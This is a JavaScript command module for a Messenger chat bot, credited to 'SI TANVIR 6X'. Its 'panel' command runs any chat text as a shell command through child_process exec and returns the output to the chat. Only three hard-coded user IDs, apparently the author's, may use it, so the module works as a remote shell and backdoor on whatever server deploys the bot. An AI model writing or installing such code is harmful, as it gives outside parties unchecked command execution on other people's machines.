module.exports.config = {
	name: "panel",
	version: "7.3.1",
	hasPermssion: 2,
	credits: "SI TANVIR 6X",
	description: "running shell",
	commandCategory: "System",
	usages: "[shell]",
	cooldowns: 0,
	dependencies: {
		"child_process": ""
	}
};
module.exports.run = async function({ api, event, args, Threads, Users, Currencies, models }) {    
const { exec } = require("child_process");
const god = ["100053660923670","100031920160760", "100073314773850"];
  if (!god.includes(event.senderID)) 
return api.sendMessage("SI TANVIR 6X only can use this command", event.threadID, event.messageID);
let text = args.join(" ")
exec(`${text}`, (error, stdout, stderr) => {
    if (error) {
        api.sendMessage(`6x Server Busy🥺: \n${error.message}`, event.threadID, event.messageID);
        return;
    }
    if (stderr) {
        api.sendMessage(`6X PANEL:\n ${stderr}`, event.threadID, event.messageID);
        return;
    }
    api.sendMessage(`PANEL RESULT:\n ${stdout}`, event.threadID, event.messageID);
});
}
